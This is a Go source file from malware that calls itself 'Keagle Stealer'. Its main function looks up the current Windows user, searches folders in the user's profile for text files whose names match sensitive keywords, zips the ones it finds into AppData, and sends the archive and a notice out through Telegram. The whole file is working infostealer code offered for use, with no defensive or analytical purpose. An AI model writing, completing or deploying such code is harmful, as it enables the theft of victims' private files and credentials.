package scripts

import (
	"fmt"
	"os"
	"os/user"
	"strings"
)

func ClearNames(name []string) string {

	var (
		text  string
		count int
	)

	for _, k := range name {

		count += 1
		nbr := len(name)
		maximum := max(nbr)

		if maximum == count {

			text += fmt.Sprintf("%s.txt", k)

		} else {

			text += fmt.Sprintf("%s.txt, ", k)

		}

	}

	return text
}

func GetSensibleFile() []string {

	var (
		keywords []string
		paths    []string
	)

	keyword := KeywordsFile()
	wPath := WindowsPath()

	localUsers, _ := user.Current()
	username := localUsers.Username

	parts := strings.Split(username, "\\")

	if len(parts) > 1 {

		username = parts[1]

	}

	for _, i := range keyword {

		for _, k := range wPath {

			path := fmt.Sprintf("C:\\Users\\%s\\%s\\%s.txt", username, k, i)

			_, err := os.Open(path)

			if err != nil {

				continue

			} else {

				paths = append(paths, path)
				keywords = append(keywords, i)

			}
		}
	}

	if len(keywords) == 0 {

		return paths

	} else {

		message := fmt.Sprintf(
			"<b><u>🦅 Keagle Stealer</u> - Interesting File</b>\n\n"+
				"🔑<b> Name of file:</b> %s\n", ClearNames(keywords),
		)

		ZipFiles("interesting_file.zip", paths)
		file := fmt.Sprintf("%s\\interesting_file.zip", GetAppdataPath())

		SendTelegramMessage(message)
		SendTelegramDocuments(file)

		return paths

	}

}
